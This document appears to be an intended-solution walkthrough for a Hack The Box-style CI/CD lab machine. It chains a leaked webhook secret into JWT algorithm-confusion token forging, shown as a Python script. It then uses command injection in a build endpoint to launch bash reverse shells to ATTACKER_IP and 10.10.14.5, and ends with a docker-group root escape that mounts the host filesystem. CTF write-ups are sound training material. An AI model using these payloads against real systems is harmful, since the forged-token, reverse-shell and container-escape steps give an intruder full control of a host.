# Courier CI/CD Platform - Exploitation Guide

## Overview
This guide demonstrates the intended attack chain for the HTB machine.

## Attack Path

### Step 1: Discover Webhook Secret
The webhook secret is hardcoded in the frontend JavaScript file.

**Location:** `courier/web/public/main.js`
```javascript
const WEBHOOK_SECRET = 'courier_webhook_secret_2024';
```

**Action:** Inspect the page source or JavaScript files to find the secret.

---

### Step 2: Trigger Webhook and Leak Information
Use the leaked secret to trigger the webhook endpoint, which returns verbose logs.

**Endpoint:** `POST /webhook/trigger`

**Request:**
```json
{
  "secret": "courier_webhook_secret_2024",
  "event": "push",
  "repository": { "name": "internal-app" }
}
```

**Response includes:**
- Repository URL: `file:///home/runner/git/internal-app.git`
- RSA public key (for JWT algorithm confusion)
- Build configuration details

---

### Step 3: JWT Algorithm Confusion
The application uses RS256 for JWT signing but doesn't enforce the algorithm during verification.

**Vulnerability:** CVE-2016-10555 - JWT algorithm confusion

**Exploit:**
1. Get the public key from webhook logs
2. Forge a JWT token using HS256 algorithm with the public key as the secret
3. Set `role: "admin"` in the payload

**Python script example:**
```python
import jwt
import requests

# Public key from webhook logs
public_key = """-----BEGIN PUBLIC KEY-----
...
-----END PUBLIC KEY-----"""

# Forge token with HS256
payload = {
    "username": "admin",
    "role": "admin",
    "iat": 1234567890
}

token = jwt.encode(payload, public_key, algorithm="HS256")

# Use token to access admin endpoints
headers = {"Authorization": f"Bearer {token}"}
response = requests.post("http://target/admin/build", 
                        json={"buildCommand": "..."}, 
                        headers=headers)
```

---

### Step 4: Command Injection via Admin Build
The admin build endpoint allows setting a build command that gets executed unsafely.

**Endpoint:** `POST /admin/build`

**Vulnerability:** Command injection via environment variable interpolation

**Exploit:**
```json
{
  "buildCommand": "/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
}
```

Or for reverse shell:
```json
{
  "buildCommand": "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"
}
```

The `runner.sh` script sources the environment file and executes `BUILD_CMD` without sanitization:
```bash
source "$ENV_FILE"
bash -c "$BUILD_CMD"
```

---

### Step 5: Docker Privilege Escalation
The `runner` user is in the `docker` group, allowing container escape to root.

**Check:**
```bash
groups
# Should show: runner docker
```

**Exploit:**
```bash
# Mount root filesystem and get root shell
docker run -it -v /:/mnt ubuntu:22.04 chroot /mnt bash

# Or create a container with root privileges
docker run -it --privileged -v /:/mnt ubuntu:22.04 chroot /mnt bash
```

**Alternative method:**
```bash
# Run container with host network and root access
docker run -it -v /:/host ubuntu:22.04 bash
chroot /host bash
```

---

## Flags

- **User flag:** `/home/runner/user.txt`
- **Root flag:** `/root/root.txt`

---

## Security Notes

- Only one RCE vector (admin build endpoint)
- Only one privesc vector (docker group)
- No alternative paths
- Deterministic and stable

